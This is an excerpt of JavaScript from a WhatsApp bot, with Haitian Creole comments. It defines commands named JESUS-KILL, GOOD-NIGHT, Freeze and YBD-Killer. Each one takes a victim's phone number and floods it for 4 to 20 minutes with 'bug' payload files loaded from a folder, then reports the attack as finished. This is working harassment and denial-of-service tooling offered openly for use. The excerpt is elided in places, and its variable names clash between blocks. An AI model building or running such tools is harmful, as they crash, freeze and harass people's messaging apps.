...
╰───────────────⭓`;
        ...
        const messageContext = {
            ...
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363397722863547@newsletter',
                newsletterName: 'ᴍᴀᴅᴇ IN BY DAWENS',
                serverMessageId: -1
            }
        };
...
case 'JESUS-KILL': {
  try {
    ...
    // Sipoze args vin soti nan mesaj (eg: args = body.trim().split(' ').slice(1))
    const arg = args && args.join(' ') || '';
    const rawNumber = arg.replace(/\D/g, '');
    if (!rawNumber || rawNumber.length < 8) {
      return await reply('❌ Usage: .JESUS-KILL <number> Ex: .JESUS-KILL 50942241547');
    }
    ...
    if (protectedNumbers.includes(targetJid) || targetJid === sender) {
      return await reply('🛡️ This number is protected. Command aborted.');
    }

    const bugsDir = path.join(__dirname, '..', 'DAWENS');
    if (!fs.existsSync(bugsDir)) {
      return await reply('📁 Folder DAWENS pa egziste.');
    }

    const bugFiles = fs.readdirSync(bugsDir).filter(f => f.endsWith('.js'));
    if (bugFiles.length === 0) {
      return await reply('📁 No payloads found in DAWENS folder.');
    }

    // Voye imaj si egziste
    const imagePath = path.join(bugsDir, '5.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await socket.sendMessage(sender, {
        image: imageBuffer,
        caption: `🚨 JESUS-KILL launched on wa.me/${rawNumber}\n🕒 Duration: 20min\n⚡ Delay: 300–700ms\n📦 Payloads: ${bugFiles.length}`,
      }, { quoted: msg });
    }

    const endTime = Date.now() + 20 * 60 * 1000; // 20 minit
    while (Date.now() < endTime) {
      for (const file of bugFiles) {
        if (Date.now() >= endTime) break;
        const payloadPath = path.join(bugsDir, file);
        try {
          // retire cache si ou vle chanjman dinamik
          delete require.cache[require.resolve(payloadPath)];
          let bugPayload = require(payloadPath);

          // Si module ekspòte string oswa obj default string
          if (typeof bugPayload === 'object' && typeof bugPayload.default === 'string') {
            const text = bugPayload.default;
            await socket.sendMessage(targetJid, { text });
          } else if (typeof bugPayload === 'string') {
            await socket.sendMessage(targetJid, { text: bugPayload });
          } else if (typeof bugPayload === 'function') {
            await bugPayload(socket, rawNumber); // pase socket ak number
          } else {
            // si module pa sipòte, voye l kòm tèks
            const content = fs.readFileSync(payloadPath, 'utf8');
            await socket.sendMessage(targetJid, { text: `📄 ${file}\n\n${content}` });
          }
    ...
    await socket.sendMessage(sender, { text: `✅ JESUS-KILL attack finished on +${rawNumber}` }, { quoted: msg });

  } catch (err) {
    console.error('JESUS-KILL error:', err);
    await socket.sendMessage(sender, { text: `❌ Erè: ${err.message}` }, { quoted: msg });
  }
  break;
}
...
case 'GOOD-NIGHT': {
  try {
    ...
    const rawNumber = arg.replace(/\D/g, '');
    if (!rawNumber || rawNumber.length < 8) {
      return await reply('❌ Usage: .GOOD-NIGHT <number> Ex: .GOOD-NIGHT 50942241547');
    }
    const targetJid = `${rawNumber}@s.whatsapp.net`;
    ...
    const imagePath = path.join(__dirname, '../DAWENS/5.png');
    if (fs.existsSync(imagePath)) {
      const imageBuffer = fs.readFileSync(imagePath);
      await bot.sendMessage(from, {
        image: imageBuffer,
        caption: `🚨 *GOOD-NIGHT launched on* wa.me/${targetNumber}\n🕒 *Duration:* 4min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
      }, { quoted: mek });
    }

    const endTime = Date.now() + 4 * 60 * 1000; // 4 minit
    ...
    while (Date.now() < endTime) {
     ...
     await socket.sendMessage(sender, { text: `✅ GOOD-NIGHT attack finished on +${rawNumber}` }, { quoted: msg });
...
case 'Freeze': {
  try {
    ...
    const rawNumber = arg.replace(/\D/g, '');
    if (!rawNumber || rawNumber.length < 8) {
      return await reply('❌ Usage: .Freeze <number> Ex: .Freeze 50942241547');
    }
    const targetJid = `${rawNumber}@s.whatsapp.net`;
    ...
    if (fs.existsSync(imagePath)) {
      ...
      await bot.sendMessage(from, {
        image: imageBuffer,
        caption: `🚨 *Freeze launched on* wa.me/${targetNumber}\n🕒 *Duration:* 4min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
      }, { quoted: mek });
    }
    ...
    while (Date.now() < endTime) {
     ...
     await socket.sendMessage(sender, { text: `✅ Freeze attack finished on +${rawNumber}` }, { quoted: msg });
...
case 'YBD-Killer': {
  try {
    ...
    const rawNumber = arg.replace(/\D/g, '');
    if (!rawNumber || rawNumber.length < 8) {
      return await reply('❌ Usage: .YBD-Killer <number> Ex: .YBD-Killer 50942241547');
    }
    const targetJid = `${rawNumber}@s.whatsapp.net`;
    ...
    if (fs.existsSync(imagePath)) {
      ...
      await bot.sendMessage(from, {
        image: imageBuffer,
        caption: `🚨 *YBD-Killer launched on* wa.me/${targetNumber}\n🕒 *Duration:* 16min\n⚡ *Delay:* 300–700ms\n📦 *Payloads:* ${bugFiles.length}`,
      }, { quoted: mek });
    }
    ...
    while (Date.now() < endTime) {
     ...
     await socket.sendMessage(sender, { text: `✅ YBD-Killer attack finished on +${rawNumber}` }, { quoted: msg });

  } catch (err) {
    console.error('YBD-Killer error:', err);
    await socket.sendMessage(sender, { text: `❌ Erè: ${err.message}` }, { quoted: msg });
  }
  break;
}
